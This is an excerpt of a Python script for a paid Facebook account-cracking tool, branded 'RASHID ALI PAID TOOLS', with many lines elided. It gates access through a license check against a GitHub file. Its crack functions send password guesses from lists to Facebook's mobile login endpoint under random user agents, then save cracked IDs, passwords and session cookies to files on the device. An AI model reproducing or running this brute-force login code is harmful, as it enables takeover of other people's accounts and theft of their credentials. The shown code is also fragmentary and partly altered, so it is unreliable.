...
#slow('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m1\x1b[10;97m]\x1b[1;93m YOU USE RASHID ALI PAID TOOLS ✌️')
#slow('\x1b[10;92m┣━\x1b[1;97m=============================================')
...
princp=[]
try:
    prox= requests.get('https://github.com/rashidshar100/Rashid/blob/main/Rashid.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/rashidshar100/Rashid/blob/main/Rashid.txt').text
        ua=open('bbnew.txt','w')
...
def DARKALWAYSONFIRE():
  ...
  id = "-".join(uuid)
  server = requests.get(f'https://github.com/rashidshar100/Rashid/blob/main/Rashid.txt').text
...
\033[1;32m(•)=================================================
\033[1;
\033[1;32m(√) \033[1;34mON FACEBOK   : \033[1;34mRashid Sindhi Shar😍
\033[1;32m(√) \033[1;35mON GITHUB    :  \033[1;35m RashidShar100(🥀)
\033[1;32m(√) \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS PAID
\033[1;32m(√) \033[1;36mTOOL VIRSION.1.0 :  \033[1;36mRANDOM🇧🇱
\033[1;32m(•)=================================================\x1b[38;5;50m""")
  ...
  try:
    httpCaht = requests.get(f"https://github.com/rashidshar100/Rashid/blob/main/Rashid.txt").text
    if id in httpCaht:
...
os.system('clear')
print(logo)
slow('\x1b[97;1m[\x1b[92;1m+\x1b[97;1m] \x1b[10;92mWellcome to  RASHID ALI PAID TOOLS') 
...
def menu():
    ...
    print( '\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m1\x1b[10;97m]\x1b[10;92m FILE CLONING\n\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m2\x1b[10;97m] \x1b[10;93mCONTACT WITH ADMIN\n\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m0\x1b[10;97m] \x1b[1;91mEXIT ')
    print( '\x1b[10;92m┣━\x1b[1;97m=============================================')
    RASHID = input('\x1b[10;92m┗━\x1b[10;92m\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92mCHOOSE \x1b[10;91m•\x1b[10;92m ')
    os.system('clear')
    print(logo)
    if RASHID in ['111']:
        login()
...
def setting():
    print('\x1b[10;92m┏━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m]\x1b[1;92m LOGIN LOVE\n\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m1\x1b[10;97m]\x1b[1;93m METHOD LoVe-!🔥 ')
    ...
    print('\x1b[10;97m┣━[\x1b[92;1m1\x1b[10;97m] YOU USE AIRPLANE MODE THEN USE TOOLS ]')
    print('\x1b[10;92m┗━\x1b[10;97m=============================================')
...
def passwrd():
    ...
    print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;94mYOUR OK IDz SAVED\x1b[10;91m • \x1b[10;93m/sdcard/RASHID•Ok💚.txt')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\x1b[10;97m{bo}[RASHID•XD]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\x1b[10;92m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/vRASHIDdate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;93m[RASHID•Cp] {idf} • {pw}')
                open("/sdcard/RASHID•cp ❌.txt")
                ...
                print(f'\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;92m[RASHID•Ok💚] {idf} • {pw}\n\x1b[33m[🌺]= COOKIES • \r\x1b[10;97m{kuki} ')
                os.system('espeak -a 300 " RASHID,  Ok,  id"')
                open('OK-RASHID/'+okc,'a').write(idf+' • '+pw+'\n')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[RASHID-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/vRASHIDdate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•RASHID-Cp] ({idf} • {pw}')
